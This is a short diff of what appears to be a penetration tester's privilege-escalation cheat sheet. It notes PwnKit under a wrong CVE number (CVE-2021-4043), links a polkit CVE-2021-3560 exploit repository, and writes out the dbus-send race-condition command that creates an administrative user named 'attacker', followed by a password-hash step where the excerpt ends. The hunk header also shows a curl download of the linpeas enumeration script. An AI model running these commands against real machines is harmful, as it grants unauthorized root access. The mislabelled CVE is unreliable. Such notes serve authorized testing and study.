@@ -192,7 +192,9 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 CVE-2021-4043 - Pwnkit exploit! - Its a handy one!
 
 polkit - https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
-1) Check for policykit-1 - apt list --installed | grep policykit-1
+
+1) Check for policykit-1 version 0.105-26ubuntu1.1
+apt list --installed | grep policykit-1
 2) send dbus message -
 dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"adm_paul" int32:1 & sleep 0.005s; kill $!
 3) Get a password hash
